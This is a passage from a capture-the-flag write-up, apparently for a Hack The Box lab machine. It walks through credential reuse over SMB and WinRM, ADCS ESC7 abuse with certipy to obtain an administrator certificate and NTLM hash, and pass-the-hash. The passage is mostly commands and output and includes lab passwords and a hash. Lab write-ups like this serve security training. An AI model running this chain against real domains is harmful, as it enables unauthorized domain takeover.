+         <span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span><span class="n">raven</span><span class="nd">@manager</span><span class="o">.</span><span class="n">htb</span><span class="o">&lt;/</span><span class="n">user</span><span class="o">&gt;</span>
+         <span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span><span class="n">R4v3nBe5tD3veloP3r</span><span class="err">!</span><span class="mi">123</span><span class="o">&lt;/</span><span class="n">password</span><span class="o">&gt;</span>
+      <span class="o">&lt;/</span><span class="n">access</span><span class="o">-</span><span class="n">user</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="n">uid</span><span class="o">-</span><span class="n">attribute</span><span class="o">&gt;</span><span class="n">cn</span><span class="o">&lt;/</span><span class="n">uid</span><span class="o">-</span><span class="n">attribute</span><span class="o">&gt;</span>
+   <span class="o">&lt;/</span><span class="n">server</span><span class="o">&gt;</span>
+   <span class="o">&lt;</span><span class="n">search</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"full"</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="nb">dir</span><span class="o">-</span><span class="nb">list</span><span class="o">&gt;</span>
+         <span class="o">&lt;</span><span class="nb">dir</span><span class="o">&gt;</span><span class="n">cn</span><span class="o">=</span><span class="n">Operator1</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">users</span><span class="p">,</span><span class="n">dc</span><span class="o">=</span><span class="n">manager</span><span class="p">,</span><span class="n">dc</span><span class="o">=</span><span class="n">htb</span><span class="o">&lt;/</span><span class="nb">dir</span><span class="o">&gt;</span>
+      <span class="o">&lt;/</span><span class="nb">dir</span><span class="o">-</span><span class="nb">list</span><span class="o">&gt;</span>
+   <span class="o">&lt;/</span><span class="n">search</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">ldap</span><span class="o">-</span><span class="n">conf</span><span class="o">&gt;</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>Contained within are credentials for the user 'Raven'. Let's validate them using <code>crackmapexec</code>.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.236</span> <span class="o">-</span><span class="n">u</span> <span class="n">raven</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">raven</span><span class="p">:</span><span class="n">R4v3nBe5tD3veloP3r</span><span class="err">!</span><span class="mi">123</span>
+</pre></div>
+<p>They work! We've obtained valid credentials for Raven. Let's verify if <code>raven</code> has WinRM access.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span><span class="n">crackmapexec</span> <span class="n">winrm</span> <span class="mf">10.10.11.236</span> <span class="o">-</span><span class="n">u</span> <span class="n">raven</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">5985</span>   <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span>
+<span class="n">HTTP</span>        <span class="mf">10.10.11.236</span>    <span class="mi">5985</span>   <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.236</span><span class="p">:</span><span class="mi">5985</span><span class="o">/</span><span class="n">wsman</span>
+<span class="n">HTTP</span>        <span class="mf">10.10.11.236</span>    <span class="mi">5985</span>   <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">raven</span><span class="p">:</span><span class="n">R4v3nBe5tD3veloP3r</span><span class="err">!</span><span class="mi">123</span> <span class="p">(</span><span class="n">Pwn3d</span><span class="err">!</span><span class="p">)</span>
+</pre></div>
+<p>As observed, Raven has WinRM access. This means that using tools like <code>Evil-WinRM</code>, we could potentially gain access to the system as Raven.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.236</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'raven'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
+
+<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">shell</span> <span class="n">v3</span><span class="mf">.5</span>
+
+<span class="n">Info</span><span class="p">:</span> <span class="n">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>
+<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Raven</span>\<span class="n">Documents</span><span class="o">&gt;</span>
+</pre></div>
+<p>We've successfully gained access to the system. We can read <code>user.txt</code> in the desktop directory.</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Raven</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="nb">type</span> <span class="o">..</span>\<span class="n">Desktop</span>\<span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="mf">448e2</span><span class="o">**********************</span><span class="mi">0</span><span class="n">f8d1</span>
+<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Raven</span>\<span class="n">Documents</span><span class="o">&gt;</span>
+</pre></div>
+<p>As Raven, we lack potentially interesting token privileges:</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Raven</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="o">/</span><span class="n">priv</span>
+
+<span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
+<span class="o">----------------------</span>
+
+<span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                    <span class="n">State</span>
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+<span class="n">SeMachineAccountPrivilege</span>     <span class="n">Add</span> <span class="n">workstations</span> <span class="n">to</span> <span class="n">domain</span>     <span class="n">Enabled</span>
+<span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>       <span class="n">Enabled</span>
+<span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="n">process</span> <span class="n">working</span> <span class="nb">set</span> <span class="n">Enabled</span>
+<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Raven</span>\<span class="n">Documents</span><span class="o">&gt;</span>
+</pre></div>
+<h3>Shell as administrator</h3><br/>
+<p>As this machine operates with ADCS (Active Directory Certificate Services):</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">ldap</span> <span class="mf">10.10.11.236</span> <span class="o">-</span><span class="n">u</span> <span class="n">raven</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> <span class="o">-</span><span class="n">M</span> <span class="n">adcs</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">LDAP</span>        <span class="mf">10.10.11.236</span>    <span class="mi">389</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">raven</span><span class="p">:</span><span class="n">R4v3nBe5tD3veloP3r</span><span class="err">!</span><span class="mi">123</span> 
+<span class="n">ADCS</span>        <span class="mf">10.10.11.236</span>    <span class="mi">389</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">LDAP</span> <span class="n">search</span> <span class="k">with</span> <span class="n">search</span> <span class="nb">filter</span> <span class="s1">'(objectClass=pKIEnrollmentService)'</span>
+<span class="n">ADCS</span>                                                <span class="n">Found</span> <span class="n">PKI</span> <span class="n">Enrollment</span> <span class="n">Server</span><span class="p">:</span> <span class="n">dc01</span><span class="o">.</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">ADCS</span>                                                <span class="n">Found</span> <span class="n">CN</span><span class="p">:</span> <span class="n">manager</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span>
+</pre></div>
+<p>We could attempt to exploit it. There are various techniques to exploit ADCS, but first, we need to determine which technique we should use.</p><br/>
+<p>Firstly, let's search for vulnerable templates using <code>certipy</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">find</span> <span class="o">-</span><span class="n">vulnerable</span> <span class="o">-</span><span class="n">stdout</span> <span class="o">-</span><span class="n">u</span> <span class="n">raven</span><span class="nd">@manager</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.11.236</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">certificate</span> <span class="n">templates</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">33</span> <span class="n">certificate</span> <span class="n">templates</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">certificate</span> <span class="n">authorities</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">certificate</span> <span class="n">authority</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">11</span> <span class="n">enabled</span> <span class="n">certificate</span> <span class="n">templates</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">CA</span> <span class="n">configuration</span> <span class="k">for</span> <span class="s1">'manager-DC01-CA'</span> <span class="n">via</span> <span class="n">CSRA</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">CA</span> <span class="n">configuration</span> <span class="k">for</span> <span class="s1">'manager-DC01-CA'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enumeration</span> <span class="n">output</span><span class="p">:</span>
+<span class="n">Certificate</span> <span class="n">Authorities</span>
+  <span class="mi">0</span>
+    <span class="n">CA</span> <span class="n">Name</span>                             <span class="p">:</span> <span class="n">manager</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span>
+    <span class="n">DNS</span> <span class="n">Name</span>                            <span class="p">:</span> <span class="n">dc01</span><span class="o">.</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+    <span class="n">Certificate</span> <span class="n">Subject</span>                 <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">manager</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">manager</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+    <span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Vulnerabilities</span>
+      <span class="n">ESC7</span>                              <span class="p">:</span> <span class="s1">'MANAGER.HTB</span><span class="se">\\</span><span class="s1">Raven'</span> <span class="n">has</span> <span class="n">dangerous</span> <span class="n">permissions</span>
+<span class="n">Certificate</span> <span class="n">Templates</span>                   <span class="p">:</span> <span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Could</span> <span class="ow">not</span> <span class="n">find</span> <span class="nb">any</span> <span class="n">certificate</span> <span class="n">templates</span>
+</pre></div>
+<p>It couldn't find any vulnerable certificate templates, but it mentions something interesting: Raven has dangerous permissions. This potentially means that Raven may have ManageCA privileges (ESC7).</p><br/>
+<p>We can attempt to exploit this vulnerability from both Linux and Windows. Let me guide you through the process specifically from Linux.</p><br/>
+<h3>ADCS Exploitation - ESC7</h3><br/>
+<p>To abuse this from Linux, we'll utilize <code>certipy</code>. You can install it from PyPi using the following command:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">certipy</span><span class="o">-</span><span class="n">ad</span>
+</pre></div>
+<p>Requirements:</p><br/>
+<ul>
+<li>Possession of only the <code>ManageCA</code> permission.</li>
+<li>Possession of the <code>Manage Certificates</code> permission (can be granted via <code>ManageCA</code>).</li>
+<li>The <code>SubCA</code> certificate template must be enabled (can be enabled via <code>ManageCA</code>).</li>
+</ul>
+<p>This method takes advantage of certain permissions that allow users to manage certificates (ManageCA). There's a type of certificate called "SubCA" that has a vulnerability (ESC1), but only administrators are allowed to request it. However, a regular user can ask for the "SubCA" certificate, get denied at first, but then the request can be approved by the manager, giving the user access they shouldn't have.</p><br/>
+<p>You can read more in <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2">HackTricks</a>.</p><br/>
+<p>First, we must enable the 'Manage Certificates' privilege. We can do this by adding our user as a new officer:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">ca</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'manager-DC01-CA'</span> <span class="o">-</span><span class="n">add</span><span class="o">-</span><span class="n">officer</span> <span class="n">raven</span> <span class="o">-</span><span class="n">username</span> <span class="s1">'raven@manager.htb'</span> <span class="o">-</span><span class="n">password</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">added</span> <span class="n">officer</span> <span class="s1">'Raven'</span> <span class="n">on</span> <span class="s1">'manager-DC01-CA'</span>
+</pre></div>
+<p>Great! Now we have to enable the SubCA template.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">ca</span> <span class="o">-</span><span class="n">username</span> <span class="s1">'raven@manager.htb'</span> <span class="o">-</span><span class="n">password</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="n">dc01</span><span class="o">.</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'manager-DC01-CA'</span> <span class="o">-</span><span class="n">enable</span><span class="o">-</span><span class="n">template</span> <span class="s1">'SubCA'</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">enabled</span> <span class="s1">'SubCA'</span> <span class="n">on</span> <span class="s1">'manager-DC01-CA'</span>
+</pre></div>
+<p>Once we have successfully enabled the SubCA template, we need to request a certificate based on it. Although the request will be denied, we will save the private key and take note of the request ID:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">req</span> <span class="o">-</span><span class="n">username</span> <span class="s1">'raven@manager.htb'</span> <span class="o">-</span><span class="n">password</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'manager-DC01-CA'</span> <span class="o">-</span><span class="n">target</span> <span class="n">dc01</span><span class="o">.</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">template</span> <span class="n">SubCA</span> <span class="o">-</span><span class="n">upn</span> <span class="n">administrator</span><span class="nd">@manager</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">certificate</span> <span class="n">via</span> <span class="n">RPC</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Got</span> <span class="n">error</span> <span class="k">while</span> <span class="n">trying</span> <span class="n">to</span> <span class="n">request</span> <span class="n">certificate</span><span class="p">:</span> <span class="n">code</span><span class="p">:</span> <span class="mh">0x80094012</span> <span class="o">-</span> <span class="n">CERTSRV_E_TEMPLATE_DENIED</span> <span class="o">-</span> <span class="n">The</span> <span class="n">permissions</span> <span class="n">on</span> <span class="n">the</span> <span class="n">certificate</span> <span class="n">template</span> <span class="n">do</span> <span class="ow">not</span> <span class="n">allow</span> <span class="n">the</span> <span class="n">current</span> <span class="n">user</span> <span class="n">to</span> <span class="n">enroll</span> <span class="k">for</span> <span class="n">this</span> <span class="nb">type</span> <span class="n">of</span> <span class="n">certificate</span><span class="o">.</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span> <span class="ow">is</span> <span class="mi">15</span>
+<span class="n">Would</span> <span class="n">you</span> <span class="n">like</span> <span class="n">to</span> <span class="n">save</span> <span class="n">the</span> <span class="n">private</span> <span class="n">key</span><span class="err">?</span> <span class="p">(</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">)</span> <span class="n">y</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="mf">15.</span><span class="n">key</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Failed</span> <span class="n">to</span> <span class="n">request</span> <span class="n">certificate</span>
+</pre></div>
+<p>Taking advantage of our <code>ManageCA</code> and <code>Manage Certificates</code> privileges, we can then issue the failed certificate with the <code>ca</code> command and the <code>-issue-request &lt;request ID&gt;</code> parameter:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">ca</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'manager-DC01-CA'</span> <span class="o">-</span><span class="n">issue</span><span class="o">-</span><span class="n">request</span> <span class="mi">15</span> <span class="o">-</span><span class="n">username</span> <span class="s1">'raven@manager.htb'</span> <span class="o">-</span><span class="n">password</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">issued</span> <span class="n">certificate</span>
+</pre></div>
+<p>Finally, we can retrieve the issued certificate with the <code>req</code> command and the <code>-retrieve &lt;request ID&gt;</code> parameter:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">req</span> <span class="o">-</span><span class="n">username</span> <span class="s1">'raven@manager.htb'</span> <span class="o">-</span><span class="n">password</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'manager-DC01-CA'</span> <span class="o">-</span><span class="n">target</span> <span class="n">dc01</span><span class="o">.</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">retrieve</span> <span class="mi">15</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Rerieving</span> <span class="n">certificate</span> <span class="k">with</span> <span class="n">ID</span> <span class="mi">15</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">retrieved</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">certificate</span> <span class="k">with</span> <span class="n">UPN</span> <span class="s1">'administrator@manager.htb'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">has</span> <span class="n">no</span> <span class="nb">object</span> <span class="n">SID</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="n">private</span> <span class="n">key</span> <span class="kn">from</span> <span class="s1">'15.key'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">'administrator.pfx'</span>
+</pre></div>
+<p>Now, with this certificate, you can utilize tools like <a href="https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py">gettgtpkinit.py</a>, <a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a>, and more, as well as the <code>auth</code> parameter of certipy:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator</span><span class="o">.</span><span class="n">pfx</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">administrator</span><span class="nd">@manager</span><span class="o">.</span><span class="n">htb</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Got</span> <span class="n">error</span> <span class="k">while</span> <span class="n">trying</span> <span class="n">to</span> <span class="n">request</span> <span class="n">TGT</span><span class="p">:</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KRB_AP_ERR_SKEW</span><span class="p">(</span><span class="n">Clock</span> <span class="n">skew</span> <span class="n">too</span> <span class="n">great</span><span class="p">)</span>
+</pre></div>
+<p>As indicated, an error occurred. The <code>KRB_AP_ERR_SKEW</code> error suggests that we need to synchronize our clock with the Domain Controller. You can accomplish this by using <code>ntpdate</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ntpdate</span> <span class="mf">10.10.11.236</span>
+<span class="mi">13</span> <span class="n">Mar</span> <span class="mi">15</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">41</span> <span class="n">ntpdate</span><span class="p">[</span><span class="mi">32443</span><span class="p">]:</span> <span class="n">step</span> <span class="n">time</span> <span class="n">server</span> <span class="mf">10.10.11.236</span> <span class="n">offset</span> <span class="o">+</span><span class="mf">25198.195972</span> <span class="n">sec</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>Finally, the authentication should be successful:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator</span><span class="o">.</span><span class="n">pfx</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">administrator</span><span class="nd">@manager</span><span class="o">.</span><span class="n">htb</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">TGT</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">'administrator.ccache'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'administrator'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'administrator@manager.htb'</span><span class="p">:</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">ae5064c2f62317332c88629e025924ef</span>
+</pre></div>
+<p>As observed, it retrieved the NTLM hash for the administrator user. This indicates that using the Pass-the-Hash technique, we could authenticate as the administrator user.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.236</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'ae5064c2f62317332c88629e025924ef'</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">administrator</span><span class="p">:</span><span class="n">ae5064c2f62317332c88629e025924ef</span> <span class="p">(</span><span class="n">Pwn3d</span><span class="err">!</span><span class="p">)</span>
+</pre></div>
+<p>It worked! So now, using Evil-WinRM, we can gain access to the system as <code>administrator</code>.</p><br/>
